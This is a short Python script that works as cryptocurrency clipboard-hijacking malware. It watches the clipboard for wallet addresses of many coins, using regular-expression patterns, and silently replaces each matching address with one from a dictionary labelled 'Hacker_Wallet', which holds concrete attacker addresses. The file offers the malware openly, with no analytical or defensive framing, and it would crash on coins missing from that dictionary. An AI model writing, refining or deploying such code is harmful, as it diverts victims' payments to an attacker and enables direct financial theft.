import re
import pyperclip
import time

# Algoritms of Coin and Tokens
patterns = {
    "Bitcoin (BTC)": r'^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$',
    "Ethereum (ETH)": r'^0x[a-fA-F0-9]{40}$',
    "Litecoin (LTC)": r'^(ltc1|[LM3])[a-km-zA-HJ-NP-Z1-9]{26,39}$',
    "Dogecoin (DOGE)": r'^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$',
    "Bitcoin Cash (BCH)": r'^(bitcoincash:)?(q|p)[a-z0-9]{41}$',
    "Ripple (XRP)": r'^r[0-9a-zA-Z]{24,34}$',
    "Tron (TRX)": r'^T[a-zA-Z0-9]{33}$',
    "Dash (DASH)": r'^X[1-9A-HJ-NP-Za-km-z]{33}$',
    "Cardano (ADA)": r'^addr1[0-9a-zA-Z]{58,}$',
    "Solana (SOL)": r'^[1-9A-HJ-NP-Za-km-z]{32,44}$',
    "Polkadot (DOT)": r'^[1-9A-HJ-NP-Za-km-z]{47,48}$',
    "Monero (XMR)": r'^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$',
    "Stellar (XLM)": r'^G[A-Z2-7]{55}$',
    "Cosmos (ATOM)": r'^cosmos1[0-9a-z]{38}$',
    "Tezos (XTZ)": r'^(tz1|tz2|tz3)[1-9A-HJ-NP-Za-km-z]{33}$',
    "BNB (BEP20)": r'^0x[a-fA-F0-9]{40}$',
    "USDT (TRC20)": r'^T[a-zA-Z0-9]{33}$',  
    "USDT (BEP20)": r'^0x[a-fA-F0-9]{40}$'  
    }

# Hackre Wallet Address
Hacker_Wallet = {
    "Bitcoin (BTC)": "bc1qzathtvf7nc7grt64e9kct7vx4zx0le0nw0cr82",
    "Ethereum (ETH)": "0x7F2873Db00b9370B2f3267B8C9cd7295BeD093Fb",
    "BNB (BEP20)": "0x7F2873Db00b9370B2f3267B8C9cd7295BeD093Fb",
    "USDT (TRC20)": "TFGX5qMZZAVeUfYuaUJhbzoCyDTmACfanq",
    "USDT (BEP20)": "0x7F2873Db00b9370B2f3267B8C9cd7295BeD093Fb",
    "Tron (TRX)": "TFGX5qMZZAVeUfYuaUJhbzoCyDTmACfanq",
    "Solana (SOL)": "EgeY3DuZj4e4VgPwgMbLYm6PcxwmXGX9v9AwAhHA1NjT"
}
# Validate the text in Clipboard
def validate_wallet(address):
    address = address.strip()
    for name, pattern in patterns.items():
        if re.fullmatch(pattern, address):
            return name
    return None

last_text = ""
while True:
    clipboard_text = pyperclip.paste().strip()

    if clipboard_text != last_text:
        last_text = clipboard_text
        result = validate_wallet(clipboard_text)
        if result:
            pyperclip.copy(Hacker_Wallet[result])
        else:
            pass

    time.sleep(1)